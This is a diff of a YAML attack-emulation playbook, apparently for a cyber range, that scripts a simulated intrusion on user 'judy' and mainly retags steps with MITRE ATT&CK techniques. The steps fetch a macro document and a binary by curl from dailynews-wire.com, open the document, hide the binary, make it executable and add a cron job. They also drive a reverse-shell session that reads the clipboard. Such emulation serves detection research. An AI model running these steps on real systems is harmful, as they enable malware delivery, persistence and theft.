@@ -90,7 +90,7 @@ commands:
     port: 5902
     creates_session: client
 
-# Opening a terminal from the menu
+  # Opening a terminal from the menu
 
   - type: vnc
     cmd: move
@@ -142,10 +142,6 @@ commands:
     cmd: type 
     input: "curl -o /home/judy/Nutzungshinweise.odt dailynews-wire.com:8086/index"
     session: client
-    metadata:
-      techniques: "T1105,T1204.002"
-      tactics: "Command and Control, Execution"
-      technique_name: "Ingress Tool Transfer,User Execution: Malicious File"
 
   - type: sleep
     seconds: 3
@@ -154,20 +150,20 @@ commands:
     cmd: key
     key: "enter"
     session: client
+    metadata:
+      techniques: "T1105,T1204.002"
+      tactics: "Command and Control, Execution"
+      technique_name: "Ingress Tool Transfer,User Execution: Malicious File"
 
   - type: sleep
-    seconds: 3
+    seconds: 5
 
   # Open the Document with the malicious macro
   - type: vnc 
     cmd: type 
     input: "soffice /home/judy/Nutzungshinweise.odt"
     session: client
-    metadata:
-      techniques: "T1204.002"
-      tactics: "Execution"
-      technique_name: "User Execution: Malicious File"
-      
+
   - type: sleep
     seconds: 1
 
@@ -249,9 +245,9 @@ commands:
     cmd: curl -o /home/judy/.local/bin/task_runner dailynews-wire.com:8082/index
     session: revshell
     metadata:
-      techniques: "T1105,T1048.001"
-      tactics: "Command and Control,Exfiltration"
-      technique_name: "Ingress Tool Transfer,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1105"
+      tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
 
   # get the last clipboard entry
   - type: msf-session
@@ -269,16 +265,16 @@ commands:
     metadata:
       techniques: "T1564.001"
       tactics: "Defense Evasion"
-      technique_name: "T1564.001 Hidden Files and Directories"
+      technique_name: "Hide Artifacts: Hidden Files and Directories"
 
   # make the veiltransfer client binary executable
   - type: msf-session
     session: revshell
     cmd: chmod +x /home/judy/.local/bin/task_runner
     metadata:
-      techniques: "T1222.002,T1048.001"
-      tactics: "Defense Evasion,Exfiltration"
-      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1222.002"
+      tactics: "Defense Evasion"
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification"
 
   # make the downloader script executable
   - type: msf-session
@@ -294,49 +290,49 @@ commands:
     session: revshell
     cmd: crontab -e
     metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
 
   - type: msf-session
     session: revshell
     cmd: ":inoremap jj <ESC>"
     metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
 
   - type: msf-session
     session: revshell
     cmd: "o"
     metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
 
   - type: msf-session
     session: revshell
     cmd: "*/10 * * * * /home/judy/download.sh"
     metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
 
   - type: msf-session
     session: revshell
     cmd: "jj"
     metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
 
   - type: msf-session
     session: revshell
     cmd: ":wq!\n"
     metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
  
   # find out which windown are open
   - type: msf-session
